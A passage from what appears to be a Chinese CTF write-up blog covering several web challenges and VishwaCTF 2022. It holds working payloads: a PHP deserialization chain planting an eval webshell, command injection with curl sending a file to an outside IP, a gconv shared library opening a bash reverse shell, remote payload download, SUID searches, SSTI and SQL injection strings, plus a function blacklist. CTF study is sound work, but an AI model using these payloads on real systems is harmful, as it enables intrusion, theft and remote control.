class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到题目后分析<br>我们应先从fin中进入，则<br>__destruct-&gt;_toString-&gt;run()-&gt;__invoke-&gt;__call-&gt;get_flag()<br>则poc为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> what();</span><br><span class="line"><span class="variable">$a2</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> crow();</span><br><span class="line"><span class="variable">$a3</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> mix();</span><br><span class="line"><span class="variable">$d</span>-&gt;m1 = <span class="string">&#x27;?&gt;&lt;?=eval($_POST[1]);&#x27;</span>;</span><br><span class="line"><span class="variable">$a3</span>-&gt;f1 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;v1 = <span class="variable">$a3</span>;</span><br><span class="line"><span class="variable">$a2</span>-&gt;f1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a2</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;f1 = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;?&gt;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>拿到本题，进入看到源码<br><img src="https://img-blog.csdnimg.cn/8b9bf4ad64fb41af87a7c8ed319e537a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>看到waf绕过了许多函数<br>在写的时候有许多不懂得，同时也想多了<br>这题给出了源代码，看到WAF过滤了小括号，感觉没办法执行函数，从而放弃eval()函数为切入点，转而看起os.system()函数。WAF中并没有过滤反引号，已知Linux中反引号是可以执行命令的，这里就可以直接利用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`ls`</span><br></pre></td></tr></table></figure><p>但是这样在eval中就会报错，导致不会执行os.system，后来想到利用Python中的注释符把反引号的内容注释了，最后Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span><span class="comment">#`ls`</span></span><br></pre></td></tr></table></figure><p>注意空格替换为%09<br>(学到了curl带外【美滋滋】)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>ls%<span class="number">60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>curl%<span class="number">09</span>http:<span class="comment">//124.222.115.141:9000%09-F%09xx=@./tmp/log.txt%60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>cat%<span class="number">09</span>Th*%<span class="number">60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>curl%<span class="number">09</span>http:<span class="comment">//124.222.115.141:9000%09-F%09xx=@./tmp/log.txt%60</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/21ec8504e29c4a578e25d9167043a25f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>直接上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/3cb8cf8bd2234388a6ada60a7fddeac1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>经查找发现putenv,mail没有被ban<br>现在就是尝试能不能getshell，show_source没有被ban，上传的时候一直被检测<br><img src="https://img-blog.csdnimg.cn/7dd3fbee46674898a5e035dd785a17a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>尝试大小写绕过发现可行(或使用其他绕过方式）</p><blockquote><p>动态绕过 <?php base64_decode('c2hvd19zb3VyY2U=')('../index.php');?><br>&lt;?php echo (‘fil’.’e_get_contents’)(‘/var/www/html/index.php’);<br>在PHP中，函数名、方法名、类名、关键字不区分大小写；但变量名、常量名区分大小写。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/a5b4f75a4c054c0d8aa667a02b5055c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>之后进行文件读取<br><img src="https://img-blog.csdnimg.cn/483380e6a9a744f5a0790f5436bb6cdb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);<span class="comment">//返回文件后缀</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看大佬博客学到两种方法<br>一、利用 include+php伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbIjEiXSk7Pz4=</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1mM2I5NGU4OGJkMWJkMzI1YWY2ZjYyODI4Yzg3ODVkZC5waHA=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以<br><img src="https://img-blog.csdnimg.cn/885139b1c44548759e40df276313be3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>之后bypass<br>通过move_uploaded_file()函数上传exp.so和gconv-modules，实现bypass disable_functions<br>paylaod.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成so文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>gconv-modules<br>通用模板</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  自定义字符集名字（大写）<span class="comment">//    INTERNAL    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span></span><br><span class="line">module  INTERNAL    自定义字符集名字（大写）<span class="comment">//    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  PAYLOAD<span class="comment">//    INTERNAL    ../../../../../../../../tmp/payload    2</span></span><br><span class="line">module  INTERNAL   PAYLOAD<span class="comment">//    ../../../../../../../../tmp/payload    2</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/8669#toc-0">原理</a><br>用 SplFileObject 写 payload.so 和 gconv-modules</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://124.222.115.141:80/payload.so&quot;</span>;</span><br><span class="line"><span class="comment">//$url = &quot;http://124.222.115.141:80/gconv-modules&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file1</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(!<span class="variable">$file1</span>-&gt;eof())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$file1</span>-&gt;fgets();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file2</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/payload.so&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="comment">//$file2 = new SplFileObject(&#x27;/tmp/gconv-modules&#x27;,&#x27;w&#x27;);</span></span><br><span class="line"><span class="variable">$file2</span>-&gt;fwrite(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/77552e4fedae45288b5ce4ff93e43e17.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);show_source(<span class="string">&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d1e160f038514860ae508d018019c68b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>提权<br>尝试suid提权</p><blockquote><p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find /bin -perm -u=s -type f 2&gt;/dev/null<br>find /usr -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null</p></blockquote><p><img src="https://img-blog.csdnimg.cn/916dc88975be41a59810f40aada1b41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VishwaCTF 2022</title>
      <link href="/2022/03/24/VishwaCTF%202022/"/>
      <url>/2022/03/24/VishwaCTF%202022/</url>
      
        <content type="html"><![CDATA[<h2 id="Hey-Buddy"><a href="#Hey-Buddy" class="headerlink" title="Hey Buddy!"></a>Hey Buddy!</h2><p>考察ssti，先利用链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现<br><img src="https://img-blog.csdnimg.cn/a81cb17995234d818565aa3f335558ab.png"><br>之后再利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">99</span>](path=%<span class="number">27</span>%<span class="number">27</span>,fullname=%<span class="number">27</span>%<span class="number">27</span>).get_data(%<span class="number">27</span>./flag.txt%<span class="number">27</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/ceeefe73b21f41939348fc753332a278.png"></p><h2 id="My-Useless-Website"><a href="#My-Useless-Website" class="headerlink" title="My Useless Website"></a>My Useless Website</h2><p>直接万能密码<br>1’ or 1=1 – +</p><h2 id="Stock-Bot"><a href="#Stock-Bot" class="headerlink" title="Stock Bot"></a>Stock Bot</h2><p>看源码发现<br><img src="https://img-blog.csdnimg.cn/c6c5056108274cf18d9b085d94a02869.png"><br>访问后发现file_get_contents函数<br>之后猜一下flag，由于源码有Flag<br>直接包含Flag得到<br><img src="https://img-blog.csdnimg.cn/129acfa2bd864d03ae3c93e7172bb131.png"></p><h2 id="Todo-List"><a href="#Todo-List" class="headerlink" title="Todo List"></a>Todo List</h2><p>看源码，发现<br><img src="https://img-blog.csdnimg.cn/a9f07eb97ea54d82b237aac3e881524e.png"><br>访问的到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> ShowSource();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$todos</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = substr(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="variable">$m</span> = substr(<span class="variable">$c</span>, <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = unserialize(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = serialize(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = sha1(<span class="variable">$m</span>);</span><br><span class="line">    setcookie(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经分析（分析有点’乱‘），得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">ShowSource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source= <span class="string">&#x27;/opt/app-root/src/flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$todos</span>[] = <span class="keyword">new</span> ShowSource();</span><br><span class="line"><span class="keyword">echo</span> sha1(serialize(<span class="variable">$todos</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$todos</span>));</span><br></pre></td></tr></table></figure><p>将todos放入cookie得到flag</p><h2 id="Strong-Encryption"><a href="#Strong-Encryption" class="headerlink" title="Strong Encryption"></a>Strong Encryption</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decrypt -&gt; 